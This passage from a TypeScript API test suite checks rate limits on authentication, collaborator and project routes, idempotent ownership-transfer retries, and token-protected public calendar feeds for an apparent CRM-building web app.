 * POST .../collaborators (invite, round 1052). All four now deliberately
 * SHARE inviteCollaboratorRateLimiter's own budget -- "how much can this
 * owner churn who has access to, or owns, this project" is one question
 * regardless of which specific action does the churning. Confirms the
 * shared budget really is shared: one invite plus role-change calls
 * exhaust it, and the 31st call across ANY of these three actions (role-
 * change, remove, transfer-ownership) is rejected with 429.
 */
test("PATCH .../collaborators/:userId/role, DELETE .../collaborators/:userId, and POST .../transfer-ownership share ONE combined rate-limit budget with POST .../collaborators (invite)", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "rate-collab-owner1@example.com");
    const collabToken = await signup(baseUrl, "rate-collab-editor1@example.com");

    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    // Call 1 of 30: invite the one real collaborator this test needs,
    // deliberately counted as part of the shared budget below.
    const inviteRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "rate-collab-editor1@example.com" }),
    });
    assert.equal(inviteRes.status, 201);
    const { collaborators } = (await inviteRes.json()) as { collaborators: { userId: string }[] };
    const collabUserId = collaborators[0].userId;

    // Calls 2-30 of 30: harmless, idempotent role-change calls (toggling
    // back to the same "editor" role every time) spend the rest of the
    // shared budget without actually changing anything real.
    for (let i = 0; i < 29; i++) {
      const res = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators/${collabUserId}/role`, {
        method: "PATCH",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ role: "editor" }),
      });
      assert.notEqual(res.status, 429, `role-change ${i + 2} of 30 (within the shared limit) must not be rate-limited yet`);
    }

    // Call 31: a DIFFERENT action in the same shared family (remove) must
    // already be blocked, proving the budget really is shared across
    // invite/role-change/remove, not three independent 30-call budgets.
    const blockedRemove = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators/${collabUserId}`, {
      method: "DELETE",
      headers: authHeaders(ownerToken),
    });
    assert.equal(blockedRemove.status, 429);
    assert.equal(((await blockedRemove.json()) as { code?: string }).code, "RATE_LIMITED");

    // transfer-ownership, the newest member of this same shared family,
    // must be blocked too.
    const blockedTransfer = await fetch(`${baseUrl}/api/projects/${project.id}/transfer-ownership`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ userId: collabUserId }),
    });
    assert.equal(blockedTransfer.status, 429);

    // A different account must get its own fresh allowance.
    const otherOwnerToken = await signup(baseUrl, "rate-collab-owner1-other@example.com");
    const otherCreateRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(otherOwnerToken),
      body: JSON.stringify({ description: "A different CRM." }),
    });
    const { project: otherProject } = (await otherCreateRes.json()) as { project: { id: string } };
    const otherInviteRes = await fetch(`${baseUrl}/api/projects/${otherProject.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(otherOwnerToken),
      body: JSON.stringify({ email: "rate-collab-editor1@example.com" }),
    });
    assert.equal(otherInviteRes.status, 201, "a different account must not be collaterally blocked by another account's own shared budget");
  });
});

/**
 * Round 1189: this route's own effect invalidates the exact auth check
 * (requireProjectOwner) a retry re-evaluates -- once the transfer
 * succeeds, the caller is no longer project.ownerId, so a retry with no
 * idempotency protection used to 404 ("Project not found") for a transfer
 * that, from the caller's own point of view, already fully succeeded. Same
 * shape as DELETE /projects/:id's own round-945 idempotency test above.
 */
test("POST .../transfer-ownership retried with the same idempotency key after the first attempt already succeeded replays the original response, instead of 404ing now that the caller is no longer the owner", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "transfer-idem-owner1@example.com");
    const newOwnerToken = await signup(baseUrl, "transfer-idem-new-owner1@example.com");

    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ email: "transfer-idem-new-owner1@example.com" }),
    });
    const listRes = await fetch(`${baseUrl}/api/projects/${project.id}/collaborators`, { headers: authHeaders(ownerToken) });
    const { collaborators } = (await listRes.json()) as { collaborators: { userId: string; email: string }[] };
    const newOwnerUserId = collaborators.find((c) => c.email === "transfer-idem-new-owner1@example.com")!.userId;

    const headers = { ...authHeaders(ownerToken), "x-idempotency-key": "transfer-ownership-repro-key" };
    const firstRes = await fetch(`${baseUrl}/api/projects/${project.id}/transfer-ownership`, {
      method: "POST",
      headers,
      body: JSON.stringify({ userId: newOwnerUserId }),
    });
    assert.equal(firstRes.status, 200);
    const { project: projectAfterFirst } = (await firstRes.json()) as { project: { ownerId: string } };
    assert.equal(projectAfterFirst.ownerId, newOwnerUserId, "sanity check: the first call must have genuinely transferred ownership");

    const retryRes = await fetch(`${baseUrl}/api/projects/${project.id}/transfer-ownership`, {
      method: "POST",
      headers,
      body: JSON.stringify({ userId: newOwnerUserId }),
    });
    assert.equal(
      retryRes.status,
      200,
      "a retried transfer with the same idempotency key must replay the original success, not 404 now that the original caller is no longer the owner",
    );
    const { project: projectAfterRetry } = (await retryRes.json()) as { project: { ownerId: string } };
    assert.equal(projectAfterRetry.ownerId, newOwnerUserId, "the replayed response must still reflect the real, successful transfer");
  });
});

/**
 * Regression test for the same round-1171 finding: DELETE
 * .../integrations/whatsapp/messages (bulk-clear) and its sibling
 * .../messages/:messageId (one row at a time) had no rate limiter at all.
 * Both now share ONE dedicated whatsappHistoryRateLimiter, deliberately
 * separate from whatsappRateLimiter (reserved for WhatsApp INTEGRATION
 * churn -- connect/disconnect/send, not message-history housekeeping).
 */
test("DELETE .../integrations/whatsapp/messages (bulk-clear) and .../messages/:messageId share ONE combined rate-limit budget, separate from whatsappRateLimiter", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "rate-whatsapp-history1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    for (let i = 0; i < 30; i++) {
      const res = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/messages`, {
        method: "DELETE",
        headers: authHeaders(ownerToken),
      });
      assert.notEqual(res.status, 429, `bulk-clear ${i + 1} of 30 (within the limit) must not be rate-limited yet`);
    }

    const blockedBulk = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/messages`, {
      method: "DELETE",
      headers: authHeaders(ownerToken),
    });
    assert.equal(blockedBulk.status, 429);
    assert.equal(((await blockedBulk.json()) as { code?: string }).code, "RATE_LIMITED");

    // The single-message delete sibling must already be blocked too --
    // same shared budget, not an independent one.
    const blockedSingle = await fetch(`${baseUrl}/api/projects/${project.id}/integrations/whatsapp/messages/not-a-real-message-id`, {
      method: "DELETE",
      headers: authHeaders(ownerToken),
    });
    assert.equal(blockedSingle.status, 429);

    // A different account must get its own fresh allowance.
    const otherOwnerToken = await signup(baseUrl, "rate-whatsapp-history1-other@example.com");
    const otherCreateRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(otherOwnerToken),
      body: JSON.stringify({ description: "A different CRM." }),
    });
    const { project: otherProject } = (await otherCreateRes.json()) as { project: { id: string } };
    const otherRes = await fetch(`${baseUrl}/api/projects/${otherProject.id}/integrations/whatsapp/messages`, {
      method: "DELETE",
      headers: authHeaders(otherOwnerToken),
    });
    assert.equal(otherRes.status, 204, "a different account must not be collaterally blocked by another account's own shared budget");
  });
});

/**
 * Regression test for the same round-1171 finding: POST
 * .../calendar-feed-token/regenerate had no rate limiter at all, unlike
 * every sibling owner-only mutation this file already guards. Given its
 * own severity (breaking every collaborator's live subscription with no
 * warning), it gets its own dedicated limiter rather than sharing one.
 */
test("PATCH .../name and PATCH .../description share ONE combined rate-limit budget: the 61st call across both routes is rejected with 429, while a different account is unaffected", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "rate-metadata1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    for (let i = 0; i < 30; i++) {
      const res = await fetch(`${baseUrl}/api/projects/${project.id}/name`, {
        method: "PATCH",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ name: `Renamed ${i}` }),
      });
      assert.notEqual(res.status, 429, `name update ${i + 1} of 30 (within the limit) must not be rate-limited yet`);
    }
    for (let i = 0; i < 30; i++) {
      const res = await fetch(`${baseUrl}/api/projects/${project.id}/description`, {
        method: "PATCH",
        headers: authHeaders(ownerToken),
        body: JSON.stringify({ description: `Redescribed ${i}` }),
      });
      assert.notEqual(res.status, 429, `description update ${i + 1} of 30 (within the limit) must not be rate-limited yet`);
    }

    // 60 calls total have now been spent across both routes combined. The
    // 61st call -- on EITHER route -- must already be blocked, proving one
    // shared budget rather than two independent 60-call allowances.
    const blockedName = await fetch(`${baseUrl}/api/projects/${project.id}/name`, {
      method: "PATCH",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ name: "One too many" }),
    });
    assert.equal(blockedName.status, 429);
    assert.equal(((await blockedName.json()) as { code?: string }).code, "RATE_LIMITED");

    const blockedDescription = await fetch(`${baseUrl}/api/projects/${project.id}/description`, {
      method: "PATCH",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "Also one too many" }),
    });
    assert.equal(blockedDescription.status, 429);
    assert.equal(((await blockedDescription.json()) as { code?: string }).code, "RATE_LIMITED");

    // A different account must get its own fresh allowance.
    const otherOwnerToken = await signup(baseUrl, "rate-metadata1-other@example.com");
    const otherCreateRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(otherOwnerToken),
      body: JSON.stringify({ description: "A different CRM." }),
    });
    const { project: otherProject } = (await otherCreateRes.json()) as { project: { id: string } };
    const otherRes = await fetch(`${baseUrl}/api/projects/${otherProject.id}/name`, {
      method: "PATCH",
      headers: authHeaders(otherOwnerToken),
      body: JSON.stringify({ name: "Unaffected" }),
    });
    assert.equal(otherRes.status, 200, "a different account must not be collaterally blocked by another account's own shared budget");
  });
});

/**
 * Round 1179: `DELETE /projects/:id` -- this route's own doc comment calls
 * it "the single most destructive route in the app" -- had NO volumetric
 * throttle at all, unlike every other mutating route in this file
 * (rounds 1052/1053/1069/1070/1082/1086/1109/1110/1146/1153/1163/1169/
 * 1171/1172 already closed this exact "unguarded mutating route" gap
 * everywhere else it was found). Gets its own dedicated budget rather
 * than sharing projectCreationRateLimiter's: creating and deleting a
 * project are different real questions with different per-call costs
 * (this route also tears down a live WhatsApp Web socket and walks the
 * project's uploads directory on disk). Uses /projects/from-template
 * (cheap and unthrottled) to generate the projects this test then
 * deletes, isolating the test to projectDeletionRateLimiter alone.
 */
test("DELETE /projects/:id has its own per-user rate limit: the 21st delete is rejected with 429, while a different account is unaffected", async () => {
  await withServer(async (baseUrl) => {
    const token = await signup(baseUrl, "rate-limit-delete@example.com");

    for (let i = 0; i < 20; i++) {
      const createRes = await fetch(`${baseUrl}/api/projects/from-template`, {
        method: "POST",
        headers: authHeaders(token),
        body: JSON.stringify({ templateId: "crm" }),
      });
      const { project } = (await createRes.json()) as { project: { id: string } };
      const deleteRes = await fetch(`${baseUrl}/api/projects/${project.id}`, { method: "DELETE", headers: authHeaders(token) });
      assert.notEqual(deleteRes.status, 429, `delete ${i + 1} of 20 (within the limit) must not be rate-limited yet`);
    }

    const extraCreateRes = await fetch(`${baseUrl}/api/projects/from-template`, {
      method: "POST",
      headers: authHeaders(token),
      body: JSON.stringify({ templateId: "crm" }),
    });
    const { project: extraProject } = (await extraCreateRes.json()) as { project: { id: string } };
    const blocked = await fetch(`${baseUrl}/api/projects/${extraProject.id}`, { method: "DELETE", headers: authHeaders(token) });
    assert.equal(blocked.status, 429);
    assert.equal(((await blocked.json()) as { code?: string }).code, "RATE_LIMITED");

    // A completely different account must get its own fresh allowance --
    // keyed by user id, not IP, so one account exhausting its own budget
    // must never collaterally block an unrelated account.
    const otherToken = await signup(baseUrl, "rate-limit-delete-other@example.com");
    const otherCreateRes = await fetch(`${baseUrl}/api/projects/from-template`, {
      method: "POST",
      headers: authHeaders(otherToken),
      body: JSON.stringify({ templateId: "crm" }),
    });
    const { project: otherProject } = (await otherCreateRes.json()) as { project: { id: string } };
    const otherRes = await fetch(`${baseUrl}/api/projects/${otherProject.id}`, { method: "DELETE", headers: authHeaders(otherToken) });
    assert.equal(otherRes.status, 204, "a different account must not be collaterally blocked by another account's own rate limit");
  });
});

test("POST .../calendar-feed-token/regenerate is rate-limited per authenticated account: the 31st regenerate is rejected with 429, while a different account is unaffected", async () => {
  await withServer(async (baseUrl) => {
    const ownerToken = await signup(baseUrl, "rate-feed-token1@example.com");
    const createRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(ownerToken),
      body: JSON.stringify({ description: "A CRM with customers and deals." }),
    });
    const { project } = (await createRes.json()) as { project: { id: string } };

    for (let i = 0; i < 30; i++) {
      const res = await fetch(`${baseUrl}/api/projects/${project.id}/calendar-feed-token/regenerate`, {
        method: "POST",
        headers: authHeaders(ownerToken),
      });
      assert.notEqual(res.status, 429, `regenerate ${i + 1} of 30 (within the limit) must not be rate-limited yet`);
    }

    const blocked = await fetch(`${baseUrl}/api/projects/${project.id}/calendar-feed-token/regenerate`, {
      method: "POST",
      headers: authHeaders(ownerToken),
    });
    assert.equal(blocked.status, 429);
    assert.equal(((await blocked.json()) as { code?: string }).code, "RATE_LIMITED");

    // A different account must get its own fresh allowance.
    const otherOwnerToken = await signup(baseUrl, "rate-feed-token1-other@example.com");
    const otherCreateRes = await fetch(`${baseUrl}/api/projects`, {
      method: "POST",
      headers: authHeaders(otherOwnerToken),
      body: JSON.stringify({ description: "A different CRM." }),
    });
    const { project: otherProject } = (await otherCreateRes.json()) as { project: { id: string } };
    const otherRes = await fetch(`${baseUrl}/api/projects/${otherProject.id}/calendar-feed-token/regenerate`, {
      method: "POST",
      headers: authHeaders(otherOwnerToken),
    });
    assert.equal(otherRes.status, 200, "a different account must not be collaterally blocked by another account's own shared budget");
  });
});

test("POST /auth/signup is rate-limited per IP: the 21st signup attempt in the window is rejected with 429 even though every earlier one used a distinct, otherwise-valid email", async () => {
  await withServer(async (baseUrl) => {
    for (let i = 0; i < 20; i++) {
      const res = await fetch(`${baseUrl}/api/auth/signup`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email: `rate-limit-signup-${i}@example.com`, password: "correct-horse-battery" }),
      });
      assert.equal(res.status, 201, `signup ${i + 1} of 20 (within the limit) must still succeed normally`);
    }
    const blocked = await fetch(`${baseUrl}/api/auth/signup`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email: "rate-limit-signup-21@example.com", password: "correct-horse-battery" }),
    });
    assert.equal(blocked.status, 429);
    assert.equal(((await blocked.json()) as { code?: string }).code, "RATE_LIMITED");
  });
});

test("POST /auth/login is rate-limited per IP: the 31st login attempt in the window is rejected with 429, protecting against unbounded password brute-forcing", async () => {
  await withServer(async (baseUrl) => {
    const email = "rate-limit-login@example.com";
    await signup(baseUrl, email);
    for (let i = 0; i < 30; i++) {
      const res = await fetch(`${baseUrl}/api/auth/login`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email, password: "wrong-password-guess" }),
      });
      assert.equal(res.status, 401, `login attempt ${i + 1} of 30 (within the limit) must still get the normal invalid-credentials response, not a 429`);
    }
    const blocked = await fetch(`${baseUrl}/api/auth/login`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email, password: "wrong-password-guess" }),
    });
    assert.equal(blocked.status, 429);
    assert.equal(((await blocked.json()) as { code?: string }).code, "RATE_LIMITED");
  });
});

test("POST /auth/forgot-password is rate-limited per TARGET EMAIL: the 6th reset request for the same victim email in the window is rejected with 429, while a request for a completely different email is unaffected", async () => {
  const emailSender = createFakeEmailSender();
  await withServer(
    async (baseUrl) => {
      const victimEmail = "rate-limit-victim@example.com";
      await signup(baseUrl, victimEmail);
      for (let i = 0; i < 5; i++) {
        const res = await fetch(`${baseUrl}/api/auth/forgot-password`, {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({ email: victimEmail, lang: "en" }),
        });
        assert.equal(res.status, 200, `forgot-password request ${i + 1} of 5 (within the limit) must still succeed normally`);
      }
      const blocked = await fetch(`${baseUrl}/api/auth/forgot-password`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email: victimEmail, lang: "en" }),
      });
      assert.equal(blocked.status, 429);
      assert.equal(((await blocked.json()) as { code?: string }).code, "RATE_LIMITED");

      // A different target email must still get its own fresh allowance --
      // this is keyed by the email being reset, not by the caller's IP (the
      // same IP just got rate-limited above), so an attacker exhausting one
      // victim's allowance must never collaterally block requests for
      // anyone else.
      const unrelatedEmailRes = await fetch(`${baseUrl}/api/auth/forgot-password`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email: "someone-else-entirely@example.com", lang: "en" }),
      });
      assert.equal(unrelatedEmailRes.status, 200, "a different target email must not be collaterally blocked by the victim email's own rate limit");
    },
    { emailSender },
  );
});

/**
 * Round 857: every other unauthenticated POST route in the login flow
 * (signup/login/forgot-password, all tested above) already had a
 * volumetric rate limiter -- this route, the literal second half of the
 * same login flow, had none at all. Not a code-guessing test (that's
 * already covered by the "locks it out after too many wrong attempts"
 * test above, a permanent per-row cap independent of request rate) --
 * this confirms the separate, previously-missing IP-keyed throttle on
 * request volume itself. Uses wrong-code calls against one real
 * loginCodeId purely as a cheap way to generate 31 real requests to this
 * route; the exact error code for any individual call doesn't matter
 * (the row's own 5-attempt cap means some of these 401s are
 * INVALID_LOGIN_CODE and some are LOGIN_CODE_EXPIRED once it's deleted --
 * both still real responses to a real request, which is all this test needs).
 */
test("POST /auth/login/verify-code is rate-limited per IP: the 31st request in the window is rejected with 429", async () => {
  const emailSender = createFakeEmailSender();
  await withServer(
    async (baseUrl) => {
      const email = "rate-limit-verify-code@example.com";
      await signup(baseUrl, email);
      const loginRes = await fetch(`${baseUrl}/api/auth/login`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ email, password: "correct-horse-battery" }),
      });
      const { loginCodeId } = (await loginRes.json()) as { loginCodeId: string };

      for (let i = 0; i < 30; i++) {
        const res = await fetch(`${baseUrl}/api/auth/login/verify-code`, {
          method: "POST",
          headers: { "content-type": "application/json" },
          body: JSON.stringify({ loginCodeId, code: "000000" }),
        });
        assert.notEqual(res.status, 429, `verify-code request ${i + 1} of 30 (within the limit) must not be rate-limited yet`);
      }
      const blocked = await fetch(`${baseUrl}/api/auth/login/verify-code`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ loginCodeId, code: "000000" }),
      });
      assert.equal(blocked.status, 429);
      assert.equal(((await blocked.json()) as { code?: string }).code, "RATE_LIMITED");
    },
    { emailSender },
  );
});

/**
 * Round 894: the one unauthenticated POST route in routes/auth.ts that was
 * missed when round 857 (just above) and the original signup/login/
 * forgot-password rate limiters were added -- confirmed by direct
 * inspection that it had no rate-limiting middleware applied at all. Not a
 * token-guessing test (the reset token is a high-entropy random value, so
 * brute-forcing it is already infeasible regardless of any rate limit) --
 * this confirms the separate, previously-missing IP-keyed throttle on
 * request volume itself, the identical class of gap round 857 closed for
 * verify-code. Uses garbage token values purely as a cheap way to generate
 * 31 real requests to this route; each individually still returns 401
 * RESET_TOKEN_INVALID, which is all this test needs.
 */
test("POST /auth/reset-password is rate-limited per IP: the 31st request in the window is rejected with 429", async () => {
  await withServer(async (baseUrl) => {
    for (let i = 0; i < 30; i++) {
      const res = await fetch(`${baseUrl}/api/auth/reset-password`, {
        method: "POST",
        headers: { "content-type": "application/json" },
        body: JSON.stringify({ token: `garbage-token-${i}`, newPassword: "correct-horse-battery" }),
      });
      assert.notEqual(res.status, 429, `reset-password request ${i + 1} of 30 (within the limit) must not be rate-limited yet`);
      assert.equal(res.status, 401, "a garbage token must still get the normal invalid-token response, not a 429");
    }
    const blocked = await fetch(`${baseUrl}/api/auth/reset-password`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ token: "garbage-token-30", newPassword: "correct-horse-battery" }),
    });
    assert.equal(blocked.status, 429);
    assert.equal(((await blocked.json()) as { code?: string }).code, "RATE_LIMITED");
  });
});

/**
 * Round 896: the one credential-CHECKING route in routes/auth.ts that
 * stayed unthrottled -- every sibling that compares a real secret (login,
 * verify-code, reset-password's own lookup) already got a rate limiter in
 * rounds 857/894; PATCH /auth/password's own `currentPassword` check was
 * missed. The realistic attacker here already holds a valid stolen/shared
 * session token but not the real password, using this route to brute-force
 * it at whatever rate their own hardware allows. Keyed by the authenticated
 * user's own id (not IP), so this confirms the limit follows the account,
 * not the source -- a DIFFERENT account's own attempts, from the same test
 * run, must be unaffected by the first account's own block.
 */
test("PATCH /auth/password is rate-limited per authenticated account: the 31st wrong-currentPassword attempt is rejected with 429, while a different account is unaffected", async () => {
  await withServer(async (baseUrl) => {
    const email = `change-pw-rate-limit-${Date.now()}@example.com`;
    const signupRes = await fetch(`${baseUrl}/api/auth/signup`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email, password: "original-password" }),
    });
    const { token } = (await signupRes.json()) as { token: string };

    for (let i = 0; i < 30; i++) {
      const res = await fetch(`${baseUrl}/api/auth/password`, {
        method: "PATCH",
        headers: authHeaders(token),
        body: JSON.stringify({ currentPassword: `wrong-password-${i}`, newPassword: "brand-new-password" }),
      });
      assert.notEqual(res.status, 429, `password-change attempt ${i + 1} of 30 (within the limit) must not be rate-limited yet`);
      assert.equal(res.status, 401, "a wrong currentPassword must still get the normal invalid-password response, not a 429");
    }
    const blocked = await fetch(`${baseUrl}/api/auth/password`, {
      method: "PATCH",
      headers: authHeaders(token),
      body: JSON.stringify({ currentPassword: "wrong-password-30", newPassword: "brand-new-password" }),
    });
    assert.equal(blocked.status, 429);
    assert.equal(((await blocked.json()) as { code?: string }).code, "RATE_LIMITED");

    const otherEmail = `change-pw-rate-limit-other-${Date.now()}@example.com`;
    const otherSignupRes = await fetch(`${baseUrl}/api/auth/signup`, {
      method: "POST",
      headers: { "content-type": "application/json" },
      body: JSON.stringify({ email: otherEmail, password: "original-password" }),
    });
    const { token: otherToken } = (await otherSignupRes.json()) as { token: string };
    const otherRes = await fetch(`${baseUrl}/api/auth/password`, {
      method: "PATCH",
      headers: authHeaders(otherToken),
      body: JSON.stringify({ currentPassword: "original-password", newPassword: "brand-new-password" }),
    });
    assert.equal(otherRes.status, 204, "a different account must not be collaterally blocked by another account's own rate limit");
  });
});

/**
 * Round 1006: the live calendar subscription feed -- a "Subscribe" URL a
 * user pastes once into a real calendar app, which that app then
 * re-fetches on its own schedule forever. GET /projects/:id/calendar-feed-token
 * is the authenticated side a signed-in collaborator uses to get the
 * token; the public GET /public/calendar/:projectId/:entityName.ics route
 * (routes/calendar.ts) is what the calendar app itself actually fetches,
 * with no session of its own -- the token in the query string is its
 * whole authentication.
 */
test("GET /projects/:id/calendar-feed-token returns a real, persisted token that the public feed route then accepts", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `calendar-feed-${randomUUID()}@example.com`;
    const token = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;

    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: "Appointment", fields: [{ name: "name", type: "text", required: true }, { name: "date", type: "date", required: true }] }],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "CRM", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);
    insertRecord(db, projectId, spec.entities[0], { name: "Checkup", date: "2026-05-01" });

    const tokenRes = await fetch(`${baseUrl}/api/projects/${projectId}/calendar-feed-token`, { headers: authHeaders(token) });
    assert.equal(tokenRes.status, 200);
    const { token: feedToken } = (await tokenRes.json()) as { token: string };
    assert.ok(feedToken && feedToken.length >= 32, "expected a real, long random token");
    assert.equal(getCalendarFeedToken(db, projectId), feedToken, "the token the route returned must be the one actually persisted");

    // Repeated calls return the SAME token, not a fresh one each time --
    // a subscription URL that silently rotated would break on every
    // re-fetch for every calendar app that already subscribed.
    const tokenRes2 = await fetch(`${baseUrl}/api/projects/${projectId}/calendar-feed-token`, { headers: authHeaders(token) });
    assert.equal((await tokenRes2.json() as { token: string }).token, feedToken);

    const feedRes = await fetch(`${baseUrl}/api/public/calendar/${projectId}/Appointment.ics?token=${feedToken}`);
    assert.equal(feedRes.status, 200);
    assert.match(feedRes.headers.get("content-type") ?? "", /text\/calendar/);
    const ics = await feedRes.text();
    assert.match(ics, /BEGIN:VCALENDAR/);
    assert.match(ics, /SUMMARY:Checkup/);
  });
});

test("GET /public/calendar/:projectId/:entityName.ics 404s for a missing, wrong, or never-requested token -- the token itself is the only authentication", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `calendar-feed-bad-${randomUUID()}@example.com`;
    const authToken = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;
    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [{ name: "Appointment", fields: [{ name: "name", type: "text", required: true }, { name: "date", type: "date", required: true }] }],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "CRM", description: "test", spec });
    diffAndMigrate(db, projectId, undefined, spec);
    markProjectBuilt(db, projectId);

    // Never requested a token for this project at all yet.
    const noTokenRes = await fetch(`${baseUrl}/api/public/calendar/${projectId}/Appointment.ics?token=anything`);
    assert.equal(noTokenRes.status, 404);

    const tokenRes = await fetch(`${baseUrl}/api/projects/${projectId}/calendar-feed-token`, { headers: authHeaders(authToken) });
    const { token: realToken } = (await tokenRes.json()) as { token: string };

    const wrongTokenRes = await fetch(`${baseUrl}/api/public/calendar/${projectId}/Appointment.ics?token=${realToken}wrong`);
    assert.equal(wrongTokenRes.status, 404);

    const missingTokenRes = await fetch(`${baseUrl}/api/public/calendar/${projectId}/Appointment.ics`);
    assert.equal(missingTokenRes.status, 404);

    const wrongEntityRes = await fetch(`${baseUrl}/api/public/calendar/${projectId}/NoSuchEntity.ics?token=${realToken}`);
    assert.equal(wrongEntityRes.status, 404);

    const wrongProjectRes = await fetch(`${baseUrl}/api/public/calendar/${randomUUID()}/Appointment.ics?token=${realToken}`);
    assert.equal(wrongProjectRes.status, 404);
  });
});

test("GET /public/calendar/:projectId/:entityName.ics serves an empty-but-valid feed for a project that hasn't been built yet, and 404s for an entity with no date field", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `calendar-feed-unbuilt-${randomUUID()}@example.com`;
    const authToken = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;
    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [
        { name: "Appointment", fields: [{ name: "name", type: "text", required: true }, { name: "date", type: "date", required: true }] },
        { name: "Note", fields: [{ name: "text", type: "longtext", required: false }] },
      ],
      screens: [],
      assumptions: [],
      openQuestions: [],
    };
    const projectId = randomUUID();
    insertProject(db, { id: projectId, ownerId: user.id, name: "CRM", description: "test", spec });
    // Deliberately never built -- no diffAndMigrate/markProjectBuilt.

    const tokenRes = await fetch(`${baseUrl}/api/projects/${projectId}/calendar-feed-token`, { headers: authHeaders(authToken) });
    const { token: feedToken } = (await tokenRes.json()) as { token: string };

    const unbuiltRes = await fetch(`${baseUrl}/api/public/calendar/${projectId}/Appointment.ics?token=${feedToken}`);
    assert.equal(unbuiltRes.status, 200, "an unbuilt project's feed URL must already work, not error, so it can be set up ahead of building");
    const ics = await unbuiltRes.text();
    assert.match(ics, /BEGIN:VCALENDAR/);
    assert.doesNotMatch(ics, /BEGIN:VEVENT/, "an unbuilt project has no real records table to query, so the feed must be empty, not crash");

    const noDateFieldRes = await fetch(`${baseUrl}/api/public/calendar/${projectId}/Note.ics?token=${feedToken}`);
    assert.equal(noDateFieldRes.status, 404, "an entity with no date field at all has nothing a calendar app could ever subscribe to");
  });
});

/**
 * Round 1034: DESCRIPTION parity with the one-shot "Export ICS" button
 * (calendarIcs.ts's own buildCalendarIcs) -- before this round the live
 * feed's own VEVENTs carried only SUMMARY/DTSTART/DTEND, with no
 * per-field DESCRIPTION dump at all, and a relation field had no way to
 * be resolved through the real route (no relatedRecords were ever
 * fetched). Confirms the real route -- not just buildCalendarFeedIcs in
 * isolation -- actually fetches the related Customer entity's records
 * and resolves the Appointment's own relation field to that customer's
 * real name in DESCRIPTION.
 */
test("GET /public/calendar/:projectId/:entityName.ics's DESCRIPTION resolves a relation field to its related record's real display label", async () => {
  await withServer(async (baseUrl, db) => {
    const email = `calendar-feed-relation-${randomUUID()}@example.com`;
    const authToken = await signup(baseUrl, email);
    const user = findUserByEmail(db, email)!;
    const spec: ProductSpec = {
      summary: "test",
      personas: [],
      roles: ["Admin"],
      entities: [
        { name: "Customer", fields: [{ name: "fullName", type: "text", required: true }] },
        {
          name: "Appointment",
          fields: [
            { name: "name", type: "text", required: true },
            { name: "date", type: "date", required: true },
